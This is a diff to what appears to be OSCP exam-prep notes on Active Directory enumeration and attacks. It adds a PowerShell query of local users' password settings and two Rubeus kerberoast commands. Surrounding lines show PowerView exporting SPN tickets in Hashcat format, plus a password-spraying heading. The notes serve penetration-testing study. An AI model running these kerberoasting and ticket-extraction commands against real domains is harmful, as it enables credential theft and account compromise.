@@ -7,6 +7,7 @@ Terminology
 
 Related: [Win-Priv-Esc](https://github.com/creighton-lewis/oscp-prep/blob/main/win-privl-esc.md)
 ## External Enumeration 
+
 ### What to look for 
 - IP space 
 - Domain information 
@@ -36,7 +37,9 @@ Related: [Win-Priv-Esc](https://github.com/creighton-lewis/oscp-prep/blob/main/w
 ```
 ```
 ## Internal Enumeration 
-
+```
+Get-LocalUser -Name "UserName" | Select-Object Name, PasswordRequired, PasswordLastSet
+```
 ```
 Import-Module ActiveDirectory 
 Get-Module
@@ -178,7 +181,13 @@ Import-Module .\PowerView.ps1
 Get-DomainUser * -SPN |Select samaccountname
 Get-DomainUser * -SPN -verbose |  Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
 ```
+```
+.\rubeus.exe kerberoast /outfile:<fileName> #domain is the same 
+```
 
+```
+.\rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> #domain is different
+```
 **Password Spraying**
 
 ```
